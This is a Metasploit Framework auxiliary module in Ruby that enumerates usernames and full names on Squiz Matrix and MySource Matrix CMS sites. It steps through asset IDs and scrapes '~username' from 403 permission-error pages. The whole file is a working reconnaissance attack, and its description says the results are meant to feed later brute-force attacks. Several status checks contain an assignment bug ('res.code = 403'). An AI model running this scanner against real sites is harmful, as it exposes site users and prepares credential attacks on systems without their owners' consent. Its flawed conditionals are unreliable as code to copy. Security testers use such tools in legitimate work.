# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient

  # Reporting facilities
  include Msf::Auxiliary::Report

  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Squiz Matrix User Enumeration Scanner',
      'Description'    => %q{
        This module attempts to enumernate remote users that exist within
        the Squiz Matrix and MySource Matrix CMS by sending GET requests for asset IDs
        e.g. ?a=14 and searching for a valid username eg "~root" or "~test" which
        is prefixed by a "~" in the response. It will also try to GET the users
        full name or description, or other information. You may wish to modify
        ASSETBEGIN and ASSETEND values for greater results, or set VERBOSE.
        Information gathered may be used for later bruteforce attacks.
      },
      'Author'         => [ 'Troy Rose <troy[at]osisecurity.com.au>', 'patrick' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.osisecurity.com.au/advisories/' ],
        ],
      'DisclosureDate' => 'Nov 8 2011'))

    register_options(
      [
        OptString.new('URI', [true, 'The path to users Squiz Matrix installation', '/']),
        OptInt.new('ASSETBEGIN',  [ true, "Asset ID to start at", 1]),
        OptInt.new('ASSETEND',  [ true, "Asset ID to stop at", 100]),
      ], self.class)
  end

  def target_url
    uri = normalize_uri(datastore['URI'])
    "http://#{vhost}:#{rport}#{uri}"
  end

  def run_host(ip)
    @users_found = {}

    asset_begin = datastore['ASSETBEGIN']
    asset_end = datastore['ASSETEND']
    if (asset_begin > asset_end)
      print_error("Unable to continue. ASSETEND must be greater than ASSETBEGIN")
    end

    asset_begin.upto(asset_end) do |asset|
      do_enum(asset)
    end

    if(@users_found.empty?)
      print_status("#{target_url} - No users found.")
    else
      print_good("#{target_url} - Users found: #{@users_found.keys.sort.join(", ")}")
      report_note(
      :host => rhost,
      :port => rport,
      :proto => 'tcp',
      :sname => (ssl ? 'https' : 'http'),
      :type => 'users',
      :vhost => vhost,
      :data => {:users =>  @users_found.keys.join(", ")}
    )
    end
  end

  def do_enum(asset)
    begin
      res = send_request_cgi({
        'uri'     =>  "#{target_url}?a=#{asset}",
        'method'  => 'GET'
      }, 20)

      if (datastore['VERBOSE'])
        if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(\w+)<\/i>/)
          print_status("#{target_url}?a=#{asset} - Trying Asset: '#{asset}' title '#{$1}'")
        else
          print_status("#{target_url}?a=#{asset} - Trying Asset: '#{asset}'")
        end
      end

      if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>~(\w+)<\/i>/)
        user=$1.strip

        # try the full name of the user
        tmpasset = asset -1
        res = send_request_cgi({
          'uri'     =>  "#{target_url}?a=#{tmpasset}",
          'method'  => 'GET'
        }, 20)
        if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>Inbox<\/i>/)
          tmpasset = asset -2
          res = send_request_cgi({
            'uri'     =>  "#{target_url}?a=#{tmpasset}",
            'method'  => 'GET'
          }, 20)
          print_good("#{target_url}?a=#{asset} - Trying to obtain fullname for Asset ID '#{asset}', '#{user}'")
          if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(.*)<\/i>/)
            fullname = $1.strip
            print_good("#{target_url}?a=#{tmpasset} - Squiz Matrix User Found: '#{user}' (#{fullname})")
            @users_found["#{user} (#{fullname})"] = :reported
          end
        else
          print_good("#{target_url} - Squiz Matrix User: '#{user}'")
          @users_found[user] = :reported
        end

        report_auth_info(
        :host => rhost,
        :sname => (ssl ? 'https' : 'http'),
        :user => user,
        :port => rport,
        :proof => "WEBAPP=\"Squiz Matrix\", VHOST=#{vhost}")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end

  end
end
